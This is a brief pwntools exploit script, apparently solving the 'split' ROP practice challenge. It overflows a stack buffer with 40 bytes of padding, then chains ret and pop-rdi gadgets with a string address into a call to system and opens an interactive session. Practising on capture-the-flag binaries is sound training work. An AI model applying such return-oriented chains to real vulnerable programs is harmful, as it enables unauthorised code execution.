from pwn import gdb, process, p64   # type: ignore

#target = gdb.debug(
#    './split',
#    gdbscript='b *0x00400740'
#)
target = process('./split')

pop_rdi_ret = p64(0x00000000004007c3)
ret = p64(0x000000000040053e)
system = p64(0x0040074b)
string = p64(0x00601060)

payload = b'A' * 40
payload += ret
payload += ret
payload += pop_rdi_ret
payload += string
payload += system 
target.sendline(payload)
target.interactive()
